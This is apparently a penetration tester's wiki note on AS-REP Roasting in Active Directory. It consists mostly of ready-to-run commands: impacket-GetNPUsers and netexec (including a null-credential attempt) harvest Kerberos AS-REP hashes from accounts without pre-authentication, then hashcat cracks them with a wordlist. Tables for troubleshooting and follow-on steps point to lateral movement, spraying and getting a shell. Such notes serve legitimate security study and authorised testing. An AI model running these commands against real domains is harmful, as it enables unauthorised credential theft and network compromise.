# 🏰 AS-REP Roasting

> Accounts with **"Do not require Kerberos pre-authentication"** hand out an encrypted AS-REP to *anyone* — crackable offline with **no credentials**. Always try it early: a userlist is all you need.

Part of [[Active Directory]]. Related: [[AD Enumeration]] · [[Kerberos]] · [[Hash Cracking]] · [[Kerberoasting]]

---

## 🧠 THINK
- **No creds required** — just a valid **userlist** ([[AD Enumeration]]).
- Only affects users with the `DONT_REQ_PREAUTH` flag; often at least one exists.
- Output is a `$krb5asrep$` hash → crack with hashcat **-m 18200**.
- Set `/etc/hosts` + sync clock first.

## ⚡ RUN
Against a userlist (no password):
```bash
impacket-GetNPUsers $DOMAIN/ -usersfile users.txt -no-pass -dc-ip $DC -format hashcat -outputfile asrep.txt
```
With a cred (enumerates roastable users automatically):
```bash
netexec ldap $DC -u $U -p $P --asreproast asrep.txt
```
Sometimes works with null:
```bash
netexec ldap $DC -u '' -p '' --asreproast asrep.txt
```
**Look for:** lines starting `$krb5asrep$23$user@DOMAIN...`.

## 💥 CRACK
```bash
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```
Cracked → a valid domain credential → [[AD Lateral Movement]] / [[Kerberoasting]] / [[Password Spraying]].

## 🔁 FOUND → NEXT
| FINDING | NEXT |
|---|---|
| `$krb5asrep$` hash | `hashcat -m 18200` → password |
| Cracked cred | authed enum, Kerberoast, spray, shell |
| No roastable users | need a cred → [[Kerberoasting]] / [[Password Spraying]] |

## 🚧 FAILED → NEXT
| Problem | Do this |
|---|---|
| No hashes returned | no preauth-disabled users — pivot to spray/roast; verify userlist + FQDN |
| Skew error | `sudo ntpdate $DC`; use domain FQDN |
| Hash won't crack | bigger wordlist + rules; move on, get a cred another way |
| `GetNPUsers` empty but LDAP has flag | try `netexec ldap --asreproast`; check exact username case |

## 📇 CHEAT SHEET
```bash
impacket-GetNPUsers $DOMAIN/ -usersfile users.txt -no-pass -dc-ip $DC -format hashcat -o asrep.txt
```
```bash
hashcat -m 18200 asrep.txt rockyou.txt
```
**Kill shot:** userlist → AS-REP hash (no creds) → crack → domain cred.
